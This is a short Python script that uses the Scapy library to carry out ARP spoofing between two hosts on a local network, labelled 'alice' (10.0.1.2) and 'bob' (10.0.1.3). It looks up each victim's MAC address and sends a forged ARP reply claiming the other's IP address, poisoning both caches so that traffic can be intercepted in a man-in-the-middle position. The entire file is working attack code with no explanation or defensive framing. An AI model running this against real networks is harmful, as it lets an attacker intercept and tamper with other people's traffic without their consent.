from scapy.all import Ether, ARP, srp, send


BROADCAST = Ether(dst='ff:ff:ff:ff:ff:ff')


def spoof(src_ip: str, who_am_ip: str):
    rsp, _ = srp(BROADCAST / ARP(pdst=src_ip))
    src_mac = rsp[0][1].src
    arp_response = ARP(pdst=src_ip, hwdst=src_mac, psrc=who_am_ip, op='is-at')
    send(arp_response)


def main():
    alice = "10.0.1.2"
    bob = "10.0.1.3"
    spoof(src_ip=alice, who_am_ip=bob)
    spoof(src_ip=bob, who_am_ip=alice)


if __name__ == '__main__':
    main()
